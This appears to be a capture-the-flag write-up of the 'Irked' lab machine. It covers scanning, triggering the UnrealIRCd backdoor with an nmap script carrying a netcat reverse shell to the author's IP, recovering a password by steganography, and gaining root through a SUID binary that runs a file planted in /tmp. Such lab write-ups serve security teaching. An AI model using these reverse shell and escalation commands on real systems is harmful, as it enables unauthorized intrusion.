# Irked

# Recon

## Machine IP Setup

First, we setup the target IP and run AutoRecon on it:

```powershell
export IP=10.10.10.117
```

```bash
autorecon $IP -v
```

## Initial Results

The initial results we obtain are as follows:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled.png)

The Ports that are open are:

- 22: ssh; OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
- 80: http; Apache httpd 2.4.10 ((Debian))
- 111: rpcbind; 2-4 (RPC #100000)

## Full Results

Further scanning showed:

TCP:

- 6697: irc; UnrealIRCd
- 8067: irc; UnrealIRCd
- 43506: status; 1 (RPC #100024)
- 65534: irc; UnrealIRCd

UDP:

- 111 rpcbind udp-response ttl 63 2-4 (RPC #100000)
-rpcinfo:
    - program version port/proto service
    - 100000 2,3,4 111/tcp rpcbind
    - 100000 2,3,4 111/udp rpcbind
    - 100000 3,4 111/tcp6 rpcbind
    - 100000 3,4 111/udp6 rpcbind
    - 100024 1 36850/tcp6 status
    - 100024 1 43506/tcp status
    - 100024 1 44416/udp status
    - 100024 1 45003/udp6 status
- 120 cfdptkt no-response
- 123 ntp no-response
- 135 msrpc no-response
- 443 https no-response
- 500 isakmp no-response
- 515 printer no-response
- 518 ntalk no-response
- 623 asf-rmcp no-response
- 631 ipp no-response
- 1025 blackjack no-response
- 1718 h225gatedisc no-response
- 1900 upnp no-response
- 2049 nfs no-response
- 2222 msantipiracy no-response
- 2223 rockwell-csp2 no-response
- 3703 adobeserver-3 no-response
- 5353 mdns udp-response ttl 254 DNS-based service discovery
-dns-service-discovery:
    - 9/tcp workstation
    - Address=10.10.10.117 fe80::250:56ff:feb9:ace8
    - 80/tcp http
    - Address=10.10.10.117 fe80::250:56ff:feb9:ace8
- 49185 unknown no-response

# Enumeration (Service Version Check)

Nmap Vuln Scan:

```bash
nmap --script vuln -oA vuln $IP
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%201.png)

The vulnerability script for Nmap did not turn up with any results. 

Whenever I have access to http on port 80, I like to start there so we can take a look at the page on the browser:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%202.png)

Looking at the output of feroxbuster, we see that we have seemingly only the index.html page and the manual page.

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%203.png)

Our major clue from to image page seems to point to there being something wrong with IRC. This therefore seems to point to the open ports from our full TCP scan, 

- 6697: irc; UnrealIRCd
- 8067: irc; UnrealIRCd
- 65534: irc; UnrealIRCd

To look at what scripts there are available on nmap are, we can type the following command and press [TAB}:

```bash
ls -l /usr/share/nmap/scripts/irc-
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%204.png)

The most particular of which is the backdoor script. Therefore, we can attempt to run that script on the three ports with irc available on the IP address using the following command:

```bash
nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor $IP
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%205.png)

It seems like port 6697 and 8067 might be vulnerable to this vulnerability.

To use the exploit, we first set up a listener:

```bash
nc -nvlp 4444
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%206.png)

We can then try to send a reverse shell using the first port:

```bash
nmap -p 6697 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.17.90 4444"  $IP
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%207.png)

However, we do not seem to have any luck with the first port. Trying the second port:

```bash
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.17.90 4444"  $IP
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%208.png)

This port seems to have worked and we have have a reverse shell on our listener:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%209.png)

# Initial Foothold

To upgrade the netcat shell, we first run:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell, so we can background the session by running (CTRL + Z) and run the following command:

```bash
stty raw -echo
```

Lastly, we can run the command "fg" to bring the listener back into the foreground:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2010.png)

With the shell, we can try to find the user flag using the locate command:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2011.png)

We can try to look at the permissions for the file using:

```bash
ls -la /home/djmardov/Documents/user.txt
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2012.png)

We do not seem to have the permissions to read this file:

If we navigate to that folder and look at all the files present:

```bash
cd /home/djmardov/Documents
ls -la
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2013.png)

If we look at .backup we see:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2014.png)

Steganography usually involves trying to hide information in images, which might make it likely that we can try to extract information from the image on the website we saw.

First we install the program steghide using: 

```bash
apt-get install steghide
```

Then we can save the image from the website using:

```bash
wget http://10.10.10.117/irked.jpg
```

We can use steghide to extract the information in the image using (sf flag indicates target file):

```bash
steghide extract -sf irked.jpg
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2015.png)

We are then prompted for a passphrase, and we can try to use the password we found earlier: "UPupDOWNdownLRlrBAbaSSss"

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2016.png)

When we enter that password, we get:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2017.png)

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2018.png)

Using this password, we can try to ssh to djmardov’s machine:

```bash
ssh djmardov@$IP
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2019.png)

# User Flag

From there, we can go to get user flag via the same path we went to before:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2020.png)

# Root Flag

To elevate privileges, we might have to use LinEnum, which we can do by setting up a http server in the directory containing the file:

```bash
python3 -m http.server 9000
```

In the target machine, we download the script using wget and give it execute privileges and run it:

```bash
cd /tmp
wget http://10.10.17.90:9000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2021.png)

Parsing through the information, we see:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2022.png)

viewuser seems suspicious, so we can try to execute it with:

```bash
cd /usr/bin
viewuser
```

We get this output:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2023.png)

Seems like it is trying to execute a file at /tmp/listusers, and the viewuser owned by root is run with SUID bit. Therefore if we get listusers to spawn a shell and viewusers is the one to run it, we will have root shell. To accomplish that, we can create listusers and give it execute permissions:

```bash
echo "bash" > /tmp/listusers
chmod +x /tmp/listusers
```

When we run viewuser again:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2024.png)

We have a root shell. From there we can just grab the root flag:

![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%2025.png)

# Learning Points (Additional Points)

- To look at what scripts there are available on nmap are, we can type the following command and press [TAB}:
    
    ```bash
    ls -l /usr/share/nmap/scripts/irc-
    ```
    
    ![Untitled](Irked%20ed6ebf99181e49a49c65ec84b6e41a6a/Untitled%204.png)
    
- Using locate command is more effective to find files
- We can download images using wget:
    
    ```bash
    wget http://10.10.10.117/irked.jpg
    ```
    
- We can save coloured output using:
    
    ```bash
    script -q -c "./LinEnum.sh" filename.txt
    ```